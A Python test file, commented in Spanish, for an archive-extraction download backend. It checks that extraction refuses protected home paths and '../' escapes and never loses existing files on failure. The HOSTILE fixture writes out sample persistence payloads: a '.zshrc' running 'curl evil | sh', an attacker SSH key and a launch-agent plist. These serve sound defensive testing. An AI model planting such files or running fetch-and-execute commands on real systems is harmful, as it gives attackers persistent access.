"""Auditoría, paquete seguridad: extracción de ``download`` (#98 zonas protegidas, #125 pérdida de datos)."""

from __future__ import annotations

import io
import shutil
import tarfile
import zipfile
from pathlib import Path
from typing import Any

import pytest

from watcher_mcp.backends import BUILTIN
from watcher_mcp.backends import download as dl
from watcher_mcp.backends.download import DownloadCancelled, extract
from watcher_mcp.config import Config
from watcher_mcp.jobs import JobManager, JobState


def make_tar(path: Path, files: dict[str, bytes | None]) -> Path:
    """tar.gz con los ficheros dados (``None`` = directorio)."""
    with tarfile.open(path, "w:gz") as tf:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            if data is None:
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    return path


def make_zip(path: Path, files: dict[str, bytes]) -> Path:
    with zipfile.ZipFile(path, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return path


def tree(root: Path) -> dict[str, str]:
    return {str(p.relative_to(root)): p.read_text() for p in sorted(root.rglob("*")) if p.is_file()}


def quiet(_: str) -> None:
    return None


# --------------------------------------------------------------------------- #98: zonas protegidas por miembro
@pytest.fixture
def home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    h = tmp_path / "home"
    h.mkdir()
    monkeypatch.setenv("HOME", str(h))
    return h


HOSTILE = {
    ".zshrc": b"curl evil | sh",
    ".ssh/authorized_keys": b"ssh-rsa AAAA evil",
    "Library/LaunchAgents/evil.plist": b"<plist/>",
    ".git/hooks/post-checkout": b"#!/bin/sh\nevil",
    "ok.txt": b"inofensivo",
}


async def run_download(config: Config, archive: Path, dest: Path, monkeypatch, **params: Any):
    """El camino real (JobManager + backend download) con la descarga sustituida por una copia local."""
    def fake_fetch(url, target, *, log, **kwargs):
        shutil.copy(archive, target)
        return target.stat().st_size, "0" * 64

    monkeypatch.setattr(dl, "fetch", fake_fetch)
    manager = JobManager(config, dict(BUILTIN))
    try:
        job = await manager.submit("download", {"url": f"https://example.org/{archive.name}", "dest": str(dest),
                                                "extract": True, **params})
        await manager.wait(job.id, 30)
        return job
    finally:
        await manager.shutdown(timeout_s=5)


@pytest.mark.parametrize("fmt", ["tar", "zip"])
async def test_extract_into_home_cannot_write_protected_members(home, tmp_path, monkeypatch, fmt):
    archive = (make_tar if fmt == "tar" else make_zip)(tmp_path / f"evil.{'tar.gz' if fmt == 'tar' else 'zip'}", HOSTILE)
    config = Config(state_dir=tmp_path / "state", allowed_backends=["download"], allowed_roots=[home])
    job = await run_download(config, archive, home, monkeypatch)  # dest = ~ : permitido por sí mismo
    assert job.state == JobState.FAILED
    assert "zona protegida" in (job.error or "")
    # Ni el miembro dañino ni los inofensivos: se valida TODO el archivo antes de escribir (en main:
    # .zshrc, .ssh/authorized_keys, LaunchAgents/evil.plist y .git/hooks/post-checkout quedaban escritos).
    assert tree(home) == {}
    assert not list(home.glob(".watcher-extract-*"))


async def test_extract_still_works_for_a_clean_archive(home, tmp_path, monkeypatch):
    archive = make_tar(tmp_path / "ok.tar.gz", {"app/": None, "app/main.py": b"print(1)", "app/lib/util.py": b"x = 1"})
    config = Config(state_dir=tmp_path / "state", allowed_backends=["download"], allowed_roots=[home])
    job = await run_download(config, archive, home / "proyecto", monkeypatch)
    assert job.state == JobState.SUCCEEDED, job.error
    assert tree(home / "proyecto") == {"app/main.py": "print(1)", "app/lib/util.py": "x = 1"}


def test_member_validator_is_the_same_policy_as_dest(home, tmp_path):
    config = Config(state_dir=tmp_path / "state", allowed_roots=[home])
    validate = dl.DownloadBackend(config)._member_validator()
    for bad in (home / ".zshrc", home / ".ssh" / "id_rsa", home / "Library" / "LaunchAgents" / "x.plist",
                home / "p" / ".git" / "hooks" / "pre-commit", home.parent / "fuera.txt"):
        with pytest.raises(ValueError):
            validate(bad)
    validate(home / "p" / "src" / "main.py")


# --------------------------------------------------------------------------- #125: no perder lo que ya había
def test_failed_extract_with_overwrite_never_deletes_existing_files(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    (out / "config.yml").write_text("DATOS DEL USUARIO")
    archive = make_tar(tmp_path / "a.tar.gz", {"config.yml": b"nuevo", "sub/otro.txt": b"x", "../escape": b"mal"})
    with pytest.raises(ValueError, match="entrada insegura"):
        extract(archive, out, log=quiet, overwrite=True)
    # En main: «config.yml existe tras el fallo: False» (se borraba al deshacer).
    assert tree(out) == {"config.yml": "DATOS DEL USUARIO"}
    assert not (out / "sub").exists()


def test_cancel_during_extraction_leaves_the_destination_untouched(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    (out / "config.yml").write_text("original")
    archive = make_tar(tmp_path / "a.tar.gz", {"config.yml": b"nuevo", "b.txt": b"b", "c.txt": b"c"})
    calls = iter(range(100))

    def cancelled() -> bool:
        return next(calls) >= 3  # tras escribir el primero

    with pytest.raises(DownloadCancelled):
        extract(archive, out, log=quiet, overwrite=True, cancelled=cancelled)
    assert tree(out) == {"config.yml": "original"}
    assert not list(out.glob(".watcher-extract-*"))


def test_failure_while_moving_into_place_restores_everything(tmp_path, monkeypatch):
    out = tmp_path / "out"
    out.mkdir()
    (out / "config.yml").write_text("original")
    archive = make_tar(tmp_path / "a.tar.gz", {"a.txt": b"A", "config.yml": b"nuevo", "sub/z.txt": b"Z"})
    real_move = shutil.move

    def flaky_move(src: str, dst: str, *args: Any, **kwargs: Any) -> Any:
        if str(dst).endswith("z.txt"):
            raise OSError("disco lleno")
        return real_move(src, dst, *args, **kwargs)

    monkeypatch.setattr(dl.shutil, "move", flaky_move)
    with pytest.raises(OSError, match="disco lleno"):
        extract(archive, out, log=quiet, overwrite=True)
    assert tree(out) == {"config.yml": "original"}  # lo pisado se restaura y lo nuevo (a.txt, sub/) se quita
    assert not (out / "sub").exists() and not list(out.glob(".watcher-extract-*"))


def test_overwrite_replaces_files_on_success_and_overwrite_false_checks_everything_first(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    (out / "config.yml").write_text("viejo")
    archive = make_zip(tmp_path / "a.zip", {"nuevo.txt": b"n", "config.yml": b"nuevo"})
    with pytest.raises(ValueError, match="overwrite=false"):
        extract(archive, out, log=quiet, overwrite=False)
    assert tree(out) == {"config.yml": "viejo"}  # ni siquiera nuevo.txt: se comprueba todo antes de escribir
    extract(archive, out, log=quiet, overwrite=True)
    assert tree(out) == {"config.yml": "nuevo", "nuevo.txt": "n"}


def test_a_file_where_the_archive_has_a_directory_name_is_rejected_before_writing(tmp_path):
    out = tmp_path / "out"
    (out / "datos").mkdir(parents=True)
    (out / "datos" / "x.txt").write_text("importante")
    archive = make_tar(tmp_path / "a.tar.gz", {"datos": b"soy un fichero", "otro.txt": b"o"})
    with pytest.raises(ValueError, match="es un directorio"):
        extract(archive, out, log=quiet, overwrite=True)
    assert tree(out) == {"datos/x.txt": "importante"}


def test_duplicate_members_overwrite_false_fails_and_overwrite_true_keeps_the_last(tmp_path):
    archive = make_tar(tmp_path / "a.tar.gz", {"x.txt": b"primero"})
    with tarfile.open(archive, "w:gz") as tf:
        for data in (b"primero", b"ultimo"):
            info = tarfile.TarInfo("x.txt")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    with pytest.raises(ValueError, match="repetido"):
        extract(archive, tmp_path / "a", log=quiet, overwrite=False)
    extract(archive, tmp_path / "b", log=quiet, overwrite=True)
    assert tree(tmp_path / "b") == {"x.txt": "ultimo"}


def test_extract_keeps_strip_components_member_modes_and_empty_dirs(tmp_path):
    archive = make_tar(tmp_path / "a.tar.gz", {"top/": None, "top/bin/": None, "top/bin/tool": b"#!/bin/sh\n", "top/vacio/": None})
    out = tmp_path / "out"
    written = extract(archive, out, strip_components=1, log=quiet)
    assert [p.name for p in written] == ["tool"] and (out / "vacio").is_dir()
    only = extract(archive, tmp_path / "solo", member="top/bin/tool", log=quiet)
    assert [p.name for p in only] == ["tool"]
    with pytest.raises(ValueError, match="no contiene"):
        extract(archive, tmp_path / "nada", member="no/existe", log=quiet)
